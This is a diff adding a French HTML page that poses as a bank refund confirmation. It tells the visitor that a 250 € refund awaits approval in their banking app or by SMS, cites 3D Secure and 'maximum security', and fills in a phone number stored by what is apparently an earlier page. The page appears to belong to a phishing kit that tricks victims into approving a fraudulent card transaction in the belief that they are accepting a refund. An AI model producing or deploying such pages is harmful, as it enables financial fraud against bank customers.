@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Validation Requise</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"
+        integrity="sha512-ZK2D0c3byjQj7ulKZZUOM5HjvGKmHXrdExZbKZ0KH0YnlRe5xQ8fv1Z7l3WhJ2vv+58DgNpB3cE4tK4yChyaGw=="
+        crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .phone-frame {
+            width: 360px;
+            border: 2px solid #ccc;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+        }
+
+        .screen {
+            padding: 20px;
+        }
+
+        .header {
+            background-color: #49e950;
+            color: white;
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+            font-size: 18px;
+            font-weight: bold;
+        }
+
+        .sub-header {
+            font-size: 12px;
+            margin-top: 5px;
+            text-align: center;
+        }
+
+        .warning {
+            background-color: #fff3cd;
+            color: #856404;
+            border: 1px solid #ffeeba;
+            border-radius: 10px;
+            padding: 15px;
+            margin-top: 25px;
+            font-size: 15px;
+            text-align: center;
+        }
+
+        .details {
+            margin-top: 30px;
+            font-size: 14px;
+            border-top: 1px solid #ccc;
+            padding-top: 30px;
+        }
+
+        .details h4 {
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #333;
+        }
+
+        .details p {
+            font-size: 15px;
+            margin: 6px 0;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .highlight {
+            font-weight: bold;
+            color: green;
+        }
+
+        .security {
+            background-color: #eef3fc;
+            border-left: 4px solid #4680ff;
+            padding: 10px 15px;
+            border-radius: 5px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 14px;
+            color: #3b3f5c;
+            margin-top: 60px;
+        }
+
+        .source {
+            margin-top: 25px;
+            font-size: 13px;
+            text-align: center;
+            color: #555;
+        }
+
+        .source i {
+            color: #4CAF50;
+            margin-right: 6px;
+        }
+    </style>
+
+</head>
+
+<body>
+    <div class="phone-frame">
+        <div class="screen">
+            <div class="header">
+                <img src="Yes_Check_Circle.svg.png" alt="Validation Icon"
+                    style="width: 35px; vertical-align: middle; margin-right: 10px;" />
+                Validation Requise
+                <div class="sub-header">Finalisez votre demande de remboursement</div>
+            </div>
+
+            <div class="warning">
+                <h4>
+                    <h3>Remboursement en attente de validation</h3>
+                    <img src="!.png" alt="" style="width: 50px; vertical-align: middle; margin-right: 10px;" />
+                </h4>
+                <p>Merci de vous connecter sur votre application bancaire afin d'approuver la demande de remboursement
+                    et créditer le montant sur votre carte. Validez par SMS si vous ne possédez pas l'application
+                    bancaire !</p>
+            </div>
+
+            <div class="details">
+                <h4><img src="Information.svg.png" alt="Details Icon" style="width: 30px; " /> Détails de la
+                    transaction</h4>
+                <p><strong>Montant :</strong><span class="highlight">250 €</span></p>
+                <p><strong>Date :</strong><span id="dynamic-date"></span></p>
+                <p><strong>Téléphone :</strong> <span id="phoneNumber">XXXXXXXXXX</span></p>
+            </div>
+
+            <div class="security">
+                <img src="9767164.png" alt="Security Icon" style="width: 30px; " />
+                <span><strong>Sécurité maximale :</strong> Cette opération est protégée par la norme 3D Secure.</span>
+            </div>
+
+            <div class="source">
+                Informations traitées de manière confidentielle
+            </div>
+
+        </div>
+    </div>
+    <div id="loader">
+        <img src="https://www.icegif.com/wp-content/uploads/2023/07/icegif-1263.gif" alt="Loading...">
+    </div>
+
+    <script>
+        // Affichage loader puis contenu page
+        window.addEventListener("load", () => {
+            setTimeout(() => {
+                document.getElementById("loader").style.display = "none";
+                document.getElementById("pageContent").style.display = "block";
+            }, 5000);
+        });
+
+        // Format date heure en jj/mm/aaaa hh:mm
+        function formatDateTime(date) {
+            const jour = String(date.getDate()).padStart(2, '0');
+            const mois = String(date.getMonth() + 1).padStart(2, '0');
+            const annee = date.getFullYear();
+            const heures = String(date.getHours()).padStart(2, '0');
+            const minutes = String(date.getMinutes()).padStart(2, '0');
+            return `${jour}/${mois}/${annee} ${heures}:${minutes}`;
+        }
+
+        // Met à jour la date dynamique
+        document.getElementById("dynamic-date").textContent = formatDateTime(new Date());
+
+        // Récupère le numéro de téléphone depuis localStorage et l'affiche
+        window.addEventListener('DOMContentLoaded', () => {
+            const phone = localStorage.getItem('phoneNumber');
+            if (phone) {
+                document.getElementById('phoneNumber').textContent = phone;
+            }
+        });
+    </script>
+    <script>
+        window.addEventListener('DOMContentLoaded', () => {
+            const savedPhone = localStorage.getItem('phoneNumber');
+            if (savedPhone) {
+                const phoneInput = document.getElementById('inputphonenumber');
+                phoneInput.value = savedPhone;
+            }
+        });
+    </script>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html,
+        body {
+            height: 100%;
+            font-family: sans-serif;
+        }
+
+        /* Loader container */
+        #loader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+        /* Big centered GIF */
+        #loader img {
+            width: 120px;
+        }
+
+        /* Page content */
+        #pageContent {
+            display: none;
+            padding: 20px;
+            text-align: center;
+        }
+    </style>
+</body>
+
+</html>
